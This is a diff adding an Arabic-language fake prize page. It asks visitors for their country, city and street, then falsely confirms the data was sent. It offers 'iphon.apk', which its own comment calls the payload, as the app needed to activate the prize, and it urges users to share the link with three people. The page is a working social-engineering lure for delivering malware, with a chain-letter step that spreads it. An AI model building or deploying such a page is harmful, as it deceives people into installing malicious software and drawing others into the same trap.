@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>📦 استلام الجائزة - الخطوة الأخيرة</title>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      background: linear-gradient(135deg, #f0f9ff, #cbebff);
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+
+    h1 {
+      color: #4CAF50;
+      margin-top: 40px;
+    }
+
+    form {
+      margin: 20px auto;
+      max-width: 400px;
+    }
+
+    input[type="text"] {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    button {
+      font-size: 18px;
+      padding: 14px 28px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: all 0.3s ease;
+    }
+
+    #sendBtn {
+      background-color: #2196F3;
+      color: white;
+    }
+
+    #sendBtn:hover {
+      background-color: #1976D2;
+      transform: scale(1.05);
+    }
+
+    #downloadSection {
+      display: none;
+      margin-top: 40px;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    #barcode {
+      width: 180px;
+      margin-top: 15px;
+    }
+
+    #barcodeNumber {
+      font-family: monospace;
+      margin-top: 5px;
+      color: #555;
+    }
+
+    #downloadBtn {
+      background: linear-gradient(135deg, #4CAF50, #45a049);
+      color: white;
+      font-size: 20px;
+      padding: 16px 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+
+    #downloadBtn:hover {
+      background: linear-gradient(135deg, #45a049, #3d8b40);
+      transform: scale(1.08);
+    }
+
+    #shareBtn {
+      display: none;
+      background-color: #FF9800;
+      color: white;
+      font-size: 16px;
+      padding: 12px 25px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+
+    #shareBtn:hover {
+      background-color: #F57C00;
+      transform: scale(1.05);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>📍 أدخل موقعك لاستلام الجائزة</h1>
+
+  <form id="locationForm">
+    <input type="text" id="country" placeholder="اسم الدولة" required><br>
+    <input type="text" id="city" placeholder="اسم المحافظة" required><br>
+    <input type="text" id="street" placeholder="اسم الشارع" required><br>
+    <button type="submit" id="sendBtn">إرسال البيانات</button>
+  </form>
+
+  <div id="downloadSection">
+    <h2>✅ خطوة أخيرة</h2>
+    <p>قم بتحميل التطبيق لتفعيل الجائزة</p>
+
+    <!-- باركود وهمي -->
+    <img id="barcode" src="https://barcode.tec-it.com/barcode.ashx?data=843291004732&code=EAN13&translate-esc=true" alt="Barcode">
+    <div id="barcodeNumber">843291004732</div>
+
+    <!-- زر تحميل البايلود -->
+    <a href="iphon.apk" download>
+      <button id="downloadBtn">📲 تحميل التطبيق</button>
+    </a>
+
+    <!-- زر مشاركة الرابط -->
+    <button id="shareBtn" onclick="copyLink()">📤 مشاركة رابط المسابقة</button>
+  </div>
+
+  <!-- صوت الفوز -->
+  <audio id="winSound" src="win.mp3"></audio>
+
+  <script>
+    const form = document.getElementById('locationForm');
+    const winSound = document.getElementById('winSound');
+    const downloadSection = document.getElementById('downloadSection');
+    const shareBtn = document.getElementById('shareBtn');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const country = document.getElementById('country').value.trim();
+      const city = document.getElementById('city').value.trim();
+      const street = document.getElementById('street').value.trim();
+
+      if (country && city && street) {
+        // تشغيل الصوت، إظهار المحتوى
+        winSound.play();
+        downloadSection.style.display = 'block';
+        shareBtn.style.display = 'inline-block';
+        alert("✅ تم إرسال البيانات بنجاح!");
+      } else {
+        alert("⚠️ يرجى ملء جميع الحقول.");
+      }
+    });
+
+    function copyLink() {
+      const url = window.location.href;
+      navigator.clipboard.writeText(url)
+        .then(() => {
+          alert("📋 تم نسخ الرابط! شاركه مع 3 أشخاص لتفعيل الجائزة.");
+        })
+        .catch(err => {
+          alert("❌ تعذر نسخ الرابط.");
+        });
+    }
+  </script>
+
+</body>
+</html>
